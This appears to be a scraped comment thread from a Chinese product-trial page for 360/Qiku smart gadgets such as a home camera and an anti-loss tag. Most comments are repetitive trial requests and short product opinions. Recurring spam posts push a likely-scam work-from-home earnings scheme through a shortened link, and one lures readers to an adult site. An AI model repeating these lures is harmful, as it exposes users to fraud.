～～（宝妈、学生、 上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，  我详细作讲解～  
～～（宝妈、学生、 上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o， 我详细作讲解～  
我只要那個測試駕駛技術分析
TCL没抓体感游戏吗
快到碗里来
和小米一样，预约后才有资格抢购。。就相当于进超市买门票一样。没票不让进。。
有意向的可以找我，买了一个，估计2天后到货，肯定全新的，488元。因为它不支持安卓，所以我用不了决定转手，但不二价，讲价的就别来找我，有需要联系QQ，850106773，如果在在厦门可当面交易。
有意向的可以找我，买了一个，估计2天后到货，肯定全新的，488元。
有意向的可以找我，买了一个，估计2天后到货，肯定全新的，488元。
有意向的可以找我，买了一个，估计2天后到货，肯定全新的，488元。
有意向的可以找我，买了一个，估计2天后到货，肯定全新的，488元。不讲价，QQ850106773
很优秀的产品
我硬是参与像这类免费试用产品无数了，可就是运气不好，每一次到最后的名单都没有我。我都不知道是不是还要参与这个的论坛了!
既然是智能，方便的，不如采用太阳能充电，或许更有卖点，还有防辐射也要考虑到，更重要的是这是一款手表，手表的功能一定不能丢。
支持，哈哈哈好
请问试用之后 ，如实提交试用报告后就把360家庭卫士送你了吗？
360个还蛮多的嘛，哈哈
错2600再翻一倍因为中国的出口税为百分之百所以鞋子光到中国价格就为2600乘2再加上一些经销商加价没6000买不下来噢除非中国自己制造但是性能肯定没有原版的好山寨品就这样 
10英里相当于16093.4399755米    6英里相当于9656.06398532米     8英里相当于12874.7519804米     太炫了
～～（宝妈、学生、 上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o， 我详细作讲解～
～～（宝妈、学生、 上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o， 我详细作讲解 ～
～～（宝妈、学生、 上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o， 我详细作讲解～
。。。。。。。。。。。哎。。不小的怎么赢
家里没有几栋别墅都不好意思买
支持，哈哈
我来了！！
这个好啊，未来感，期待……
这个东东，出现的好久了，一直没看到有人用过评价，全是官网上说的，不知道什么时候可以看到实评啊！！
非常期待小蜜中··············
！！！！！！！11
支持，小编，给我一个吧！！！！！！！
刚刚在众筹平台预定了一个，回头就在微博上发现360防丢卫士的试用福利，希望可以通过申请~
刚刚申请试用了360防丢卫士的试用福利，希望可以通过申请~  我确实，想要这个，渴望得到这个！小编拜托了！
更加的小巧，背后有不干胶，能够显示位置信息，卫士离开手机1米就会报警
支持！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！
！！！！！！！
快到我的身边来，我已经两次把自己锁在门外了，不想再有下一次了！！！！！！！！！！！！！
它真心挺棒，赞一个。
今年有64个赞
这个很期待
你好，我们现在在淘宝众筹中http://hi.taobao.com/market/hi/detail2014.php?spm=a215p.1192983.1997711523.19.IMWETC&amp;id=1004&amp;qq-pf-to=pcqq.group
赞一下，这个真不错
你好，我们现在在淘宝众筹中http://hi.taobao.com/market/hi/detail2014.php?spm=a215p.1192983.1997711523.19.IMWETC&amp;id=1004&amp;qq-pf-to=pcqq.group
太阳光线强烈的时候，还能看清楚吗？
支持吖，给我一个吧，给小孩用刚好
大爱的产品，真心的需要
期待了好久的啊 终于出现了 要给我机会啊14连败了啊 求求你们了给我通过吧！
真的好需要啊 
那岂不是带两个手机外出？等同于大哥大。。。。。。。。。。。。。。。
期待了好久的啊 终于出现了！大爱的产品，真心的需要fuhao:-D
如果有试用机会就不错
还行吧，试试怎么样
看起来很强大的样子哦！就是看起来有那么一点点“贵”功能强大，用的东西强大，贵是理所当然
这里可以抢线预约啦！ http://dwz6.cn/shiyue
http://dwz6.cn/shiyue 这里有详细
有点炫，不习惯的看起来要摔跤的样子，
好，很好，非常好，科技引领时代，超智能很快就出现，各个方位定点，在配置一个投影的就真的不是科幻那么简单了
看起来还是挺好的
真好，最适合我们这种马大哈啊，啊哈哈哈哈哈哈哈哈哈哈哈哈
看起来挺爽的
没有试用到，杯具……
价格高了点，好像功能不咋地吧
总喜欢发什么待机多少时间，这种东西都是用来待机的吗？真杯具 看着挺不错，实用性如何有待验证……
U盘大小的吗？
多此一举啊！带这个还不如带个充电宝呢！
太实用了，求中。
哇哇哇哇哇哇  喜欢 
谷歌cast
哇  好棒什么时候能出？
快到我的身边来，我已经两次把自己锁在门外了，不想再有下一次了！！！！！！！！！！！！！
赞！！！！！
我来了！！！产品很不错啊，加油啊360.支持你！
很喜欢，很希望拥有一个！！！
想买~~~~~~~~
太实用了，求中
360总能创造出很多奇奇怪怪的产品，给我们的生活增加了很多乐趣。每次申请试用都申请不到，不过还是支持哦~
产品不错，支持360！
最重要的就是电池待机时长了
昨天刚尝试过那款单轮的，感觉这双轮的应该比单轮的好平衡，不容易摔跤。
360也玩饥饿营销吗？大家都挺饿的了，快点放食儿吧。
第四次了一定要中呀
价格过高 土豪才会用 
第5次失败这次一定要中啊！ 
不错的产品，关注中...
http://dwz6.cn/shiyue 这里容易获取！
太酷了，真让人惊奇…………尽在奇酷网
永远支持奇酷网的智能硬件产品和服务！
啥时候能中奖啊。。。
快点公测 啊            等了很久
这个是好东西,我最希望的就是这个能中!!
求种啊，这个适合我这种马大哈
晚上警报通知有用吗
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。  
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。  
期待啊，什么时候能买到
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。  
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。  
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。  
幸运女神，砸我吧！
给你64个赞 
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。  
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。  
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。  
跪求需要啊，真的需要。。
我想了很多投影的产品的样子，今天看到你，我惊呆了！！！想要！！！
360撒都有佩服佩服。什么时候出360手机啊
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。  
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。 
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。 
机身上的点和划不是摩斯电码，那是啥子？
真的需要啊 
bucuo 
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。 
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。 
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。 
需要-.-
给我体验体验吧 谢谢
啊啊啊啊啊 我要！！！
啊啊啊啊啊 我要！！！ 
这个可以挂宠物脖子上
这个好，赞一个...
有可能会掉
太厚了，不实用 
创意新颖，十分期待，很酷
很有趣，希望别太贵 
很实用的宝贝
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。 
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。 
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。 
很有趣，不过太贵了
哈。。丢了东西怎么办。快用360牌防丢卫士。。找不着了点手机。。妈妈再也不用担心我丢东西了。。
这确实很实用啊！！！以后夜骑我再也不用带备用电池了！不过价格太贵的话那就是硬伤了，毕竟现在充电宝很便宜！
建议多种存储，支持SFTP等协议或者手机卡，毕竟企业是不会使用云存储。无论谁说的多高尚，大家心里都明白。支持自定义存储会得到企业用户，支持SD卡存储会得到家庭用户。产品毕竟是为客户服务的，不能解决客户的担心，即使再好，也不会有人用。例如：baidu的，别说收费，就是免费送，我也是不敢用的。
想要啊。。看起来很好，需要。。
跪求。。！
 一直都在关注奇酷包括微博和微信，现在家里面就孩子一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里小孩的状况。   
哈哈，这个广告词不错哦！
 男士福利！女女勿进 直接复制进入《hulai.pw》都懂的...
 男士福利！女女勿进 直接复制进入《hulai.pw》都懂的...
我们公司的都出几年时间了，这个没有我们公司的好用，比360家庭卫士多几个功能：1、支持插卡录像功能，电脑不需要开机就能录像，2、可以无线也可以接网线，高清画面链接网络远程才流畅，3、可用电脑和手机远程控制左右上下旋转，4、可以远程回放录像，有需要的朋友可以加我，空间有演示视频
很不错！！！！
我想买。。
我也是关注供电问题……其实这个创意我在大学时和同学讨论过，就是关于供电问题难以解决
这个东西有卖的，200快
不错不错不错不错
如果东西真丢了，能显示具体位置吗？还不如闹个GPS追踪器。
申请不到，可以买我们的产品
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。
喜爱足球的娃   整体来说挺好   挺中肯的建议   赞个O(∩_∩)O~
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。
不错 挺好
灰常实用的小物件啊 超喜欢的功能啊  
不错的互动
高德地图不错，有好几次我去一个不清楚的地方，都是高德地图帮了我，位置很精确，就是要这样实用上网软件才好，呵呵。
水墨屏，这样做有利也有弊。儿童护眼、看小说、消息提醒等都实用，不过增加厚度会让很多人难以接受，国外有led+水墨屏手机的出现，不过国内电子书都没卖起来，更加不提水墨屏的大范围应用。点子是好，能做薄就更好。
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。
尼玛2200w。发电厂哇
我想知道插电脑能用不
好便宜，，。。。算入境税了没
天朝屁民怎么买得起
行了，浪费，不如600的显卡划算
不是平民路线
光是防丢有点鸡肋
价格要亲密
加速充电。
价格？如何啊
便宜点最好！！！
拉风神器·
贵了，还是美元
价格是？？？？
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。
这个设计产品一直没出
价格是多少？
神回复。。。。。。。。。
奇酷的东东太棒了，每个都想拥有，每个都能戳到客户的痛处，很有卖点，这个要是能优先买就好了，能远程检查家里的情况，不管是小三还是小偷都一清二楚，还能省电话费，家里老人能方便查看状况，如果能360度旋转就好了，加个上下移动的功能就行
我们公司的都出几年时间了，这个没有我们公司的好用，比360家庭卫士多几个功能：1、支持插卡录像功能，电脑不需要开机就能录像，2、可以无线也可以接网线，高清画面链接网络远程才流畅，3、可用电脑和手机远程控制左右上下旋转，4、可以远程回放录像，有需要的朋友可以加我，空间有演示视频  
不错、小东西 很好
要是能贴在手机内部的电池上就更好了！！！
真心想知道能在多少平方的屋子内使用最好？ 净化效果才是最关键的，期待中！！！
很想试试呀！！！不让试官方能不能给个信说什么时候销售，我们心里也有个底呀。期待啊。。。。。。。。。。。
期待早点上市，喜欢360的个性，喜欢360每一样产品
希望可以和地图网络之类的连接起来
产品不错，求中啊！！！
产品不错，求中啊！！！ 
非常实用啊
关注360很久了很喜欢这款产品，求审核过
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。
很期待啊，这个产品很有市场的
挺好的设计，也很实用。就是不知道用起来能否达到预想的效果，安全性有没有保障？
很好，求送
奇酷好给力，一下子360家庭卫士，一下360防丢卫士； 真下次能出； 笔记本内置定位的神奇； 丢笔记本丢到我怕了！~！ 
这个很不错啊，求试用～售价太贵了些
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。
最期待这个，希望可以在大面积的房子使用，希望可以杀死病菌，过滤pm2.5，过滤灰尘什么的，期待中文，使用方法越简洁越好。。
有这心 花钱买一个吧 
我们公司的都出几年时间了，这个没有我们公司的好用，比360家庭卫士多几个功能：1、支持插卡录像功能，电脑不需要开机就能录像，2、可以无线也可以接网线，高清画面链接网络远程才流畅，3、可用电脑和手机远程控制左右上下旋转，4、可以远程回放录像，有需要的朋友可以加我，空间有演示视频  
想体验远程的朋友可以加我  
真心想早些见到，期待中
期待一个投影仪，不想看电视或者 ：任-何-屏！眼睛太累
这个感觉挺炫 ~
    80岁的妈妈行动不便，我们在外工作，不放心她一个人在家，如果可以申请到360家庭卫士，我就可以随时能看到老人的情况。 
一跟天线 稳定不 
奇酷雄起   一直支持你
80岁的妈妈行动不便，我们在外工作，不放心她一个人在家，如果可以申请到360家庭卫士，我就可以随时能看到老人的情况。   
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。
很期待啊。360撒都有佩服佩服
大人小孩有个保障！！！
由卫士1到2了，都还是测试，什么时候可以试用或出售，老是这样搞有什么意思，买 又买不到 
奇酷一直支持你,产品不错，
一直都在关注奇酷包括微博和微信，家里孩子放暑假在家不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里孩子的状况。  
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。
这东东也太给力了吧
这东东也太给力了吧
喜欢，赞一个！
今天在360总部体验了一把!不是挺爽!是很爽!!
很不错！感谢分享
好东西，想要一个，给我一个试用，我给一篇好的试用报告
一次又一次的申请，一次又一次的失望。。。这次幸运女神会瞄我一眼吗？？？
我去...刷屏什么的最讨厌了
期待是我啊。。。万能的360啊 抽中我一次吧。。。
万能的360啊 ！！！希望这次抽中我吧。。。
能让我用下吗 
看过类似此类产品的相关报道，但是一直没用过。看介绍是很给力，实际用着不知怎样，要不让我中一次试试这神器。
我有投影机 非常需要这个小玩意
我老丢东西，能送一个试用吗、
641xcvxc
非常想试用一个。
期待这款产品，监控非常给力、、让我抽中吧
导航我正需要。。。让我中一次行不
移动4g卡价格呢
参加几次了，什么时候我也抽中一次啊。
试用一个.
看标志跟谷歌有区别。不过比谷歌的功能更强大！
能不能给我个机会，让我再爱一回
很想试用一个，最近我老是忘事儿，东西总是不知道放到哪儿了。 
功能好多啊
小东西，大用处。除了平常的防丢失寻回功能，特别是老人小孩啊，还有俺家的小狗狗。。。 还可以监视你的另一半，好邪恶的想法。。。
怕丢了。。。。
U盘是用高速3.0
什么时候出来，价位是多少？
手机这么普及的年代，这个显得有些鸡肋。
什么时候能出来，价位多少啊？
还期待，什么时候能出来，价位多少？
喜欢是挺喜欢的，就是价位有点高！
真的好期待！
好酷啊。。
每一期都参加试用，但一次都没中，好想要360家庭卫士，在外就随时可以和家人视频，还可以进行安全监控，可以免除一重担心~
东西随便放，总是回头忘记在哪，希望360防丢卫士可以帮我尽快找到东西，不用忙忙叨叨找东西~
喜欢，32赞。
从10期到这一期，连续8期了，从没中过，希望这次能成功！！！谢谢，就算本期如果没有中，我也还会再试下去的，哪怕哪次中签了，我还是会继续试下去，我永远支持奇酷网，最喜欢奇酷网的试用频道了！！最后，我希望奇酷网继续努力，给我们的生活带来更多乐趣，谢谢！！！ 
从10期到这一期，连续7期了，从没中过，希望这次能成功！！！谢谢，就算本期如果没有中，我也还会再试下去的，哪怕哪次中签了，我还是会继续试下去，我永远支持奇酷网，最喜欢奇酷网的试用频道了！！最后，我希望奇酷网继续努力，给我们的生活带来更多乐趣，谢谢！！！ 
很好这个创意很不错
错啦！！！！！
好东西啊，很想拿到使用权。
万一手机被别人利用监控了，你家就完了。电脑摄像头不也是常常被盗用然后偷拍。我看介绍里面没有提到安全方面的问题呀
很赞，虽然不少人都说这是胶枪，不过能做出好的作品才是最有意思的，工具是辅助，重要的是开拓了思维。
很多期，都没中过。这个真心需要，求给过。
～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～～每夭5o~15o，我详细作讲解～
～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～～每夭5o~15o，我详细作讲解～  
～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～～每夭5o~15o， 我详细作讲解～  
～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～～每夭 5o~15o，我详细作讲解～  
～不限制工作时间， 做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～～每夭5o~15o，我详细作讲解～  
～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～～每夭5o~15o， 我详细作讲解～  
这款产品我一看见就喜欢的不得了，方便 功能多 能拿着与我家宝宝视频 注意要采用环保材料 这么可爱的东西我宝宝会咬的。。。希望发起人给我通过申请，给我一个，享受一下和宝宝的亲密接触 。。。我在外地 经常不能回家  电脑抱过来抱过去不方便，
楼主文采不错，赞一个，支持支持！
好东西啊，很想拿到使用权。
好东西啊，很想拿到使用权。好东西啊，很想拿到使用权。好东西啊，很想拿到使用权。 
好东西啊，很想拿到使用权。好东西啊，很想拿到使用权。好东西啊，很想拿到使用权。好东西啊，很想拿到使用权。好东西啊，很想拿到使用权。好东西啊，很想拿到使用权。好东西啊，很想拿到使用权。好东西啊，很想拿到使用权。好东西啊，很想拿到使用权。好东西啊，很想拿到使用权。好东西啊，很想拿到使用权。好东西啊，很想拿到使用权。好东西啊，
好东西啊，很想拿到使用权。好东西啊，很想拿到使用权。好东西啊，很想拿到使用权。好东西啊，很想拿到使用权。
好东西啊，很想拿到使用权。好东西啊，很想拿到使用权。好东西啊，很想拿到使用权。好东西啊，很想拿到使用权。
关注360很久了很喜欢这款产品，求审核过关注360很久了很喜欢这款产品，求审核过关注360很久了很喜欢这款产品，求审核过
关注360很久了很喜欢这款产品，求审核过关注360很久了很喜欢这款产品，求审核过
很多期，都没中过。真心喜欢，求给过。
～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～～每夭5o~15o， 我详细作讲解～  
～不限制工作时间，做的越多挣的越 多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～～每夭5o~15o， 我详细作讲解～  
～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～～ 每夭5o~15o， 我详细作讲解～  
出门找不到钥匙？打开 Blink Hub，按下 Beep 按钮；坐出租车、公交车，在咖啡厅、餐厅忘了拿随身物品？有了 Blink Locator，手机和定位器都可设置自动报警；挂在小狗脖子上，遛狗更省心；带在小孩身上，逛街时防止走失；其实就是想要一个特别的钥匙扣 / 箱包扣，有科技含量的更与众不同；出门找不到钥匙？打开 Blink Hub，按下 Beep 按钮；坐出租车、公交车，在咖啡厅、
360你真的是越做越好了。衷心的感谢你！你给网民们带来了方便实用美观高科技的好产品！！！！
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。  
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。  
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。  
好产品、喜欢
那我们的隐私呢？ 
再加上我的摄像头就完美了。
希望我可以试用的  或者购买的也可以 
还是定个合理的价格让俺买吧，俺申请好几次试用，一次都没戏，瞎耽误工夫
你是想在太阳底下暴晒吗？
共有70名额吗？已申请人数 : 112199人，去买彩票去吧，BS
一定很实用
  一块纽扣电池能用一年了 根本不需要太阳能
客厅、老人卧室。 平时工作较忙，中午不能回家照顾老人，一般将饭菜做好后放置在客厅，老人自己加工一下就可以食用了。安装摄像头可以指导老人怎么加工，最关键的是可以实时查看老人的状况，是否摔倒、是否安好。
戴在手上 晃啊晃的 能听到个啥 ？
～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～～每夭5o~15o， 我详细作讲解～  
～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～～每夭5o~15o， 我详细作讲解～  
看过视频 动作有延迟  效果不是很好  期待完美版
～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～～ 每夭5o~15o， 我详细作讲解～  
～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～～ 每夭5o~15o，  我详细作讲解～  
～不限制工作时间， 做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～～ 每夭5o~15o， 我详细作讲解～  
想要-.-
太小了，易携带，但不容易找
看上去好不错 
好好好好好
家人可以看见我自己吗？
～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～～ 每夭5o~ 15o， 我详细作讲解～  
～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～～ 每夭5o~ 15o， 我详细作讲解～  
好东西就要力顶
好东西啊，很想拿到使用权。
很期待可以试用
不错，路过前来支持！ 
如果我中签了，我打算把它放在家里，这样的话，在上班的时候也可以知晓家里的情况，随时随地地关注家里，就不怕家里来盗贼了！！~~（本人家里经常失窃~）希望360家庭卫士支持与360安全卫士类产品同步wifi连接,同时支持电脑及手机版,用以同时充当电脑及手机音频输入/输出设备，这样安全感可以提升好多呢！！~~希望我中签！快显灵哦！！我很需要！！~~
         呵呵呵           呵呵呵  
抱着试试看的心里点击了试用，我想这几率也不亚于彩票的中奖率吧。   期待     期待   期待奇迹的来临
～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～～ 每 夭5o~ 15o， 我详细作讲解～  
～不限制工作时间，做的越多挣的越多 ～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～～ 每夭5o~ 15o， 我详细作讲解～  
我建议做一个iOSiPad客户端，这样的话用大一点的屏幕看就会清楚一点
遥控拍照、手机防丢、寻找手机、信息提醒，这些在oppo n1的小叮当上就已经有了
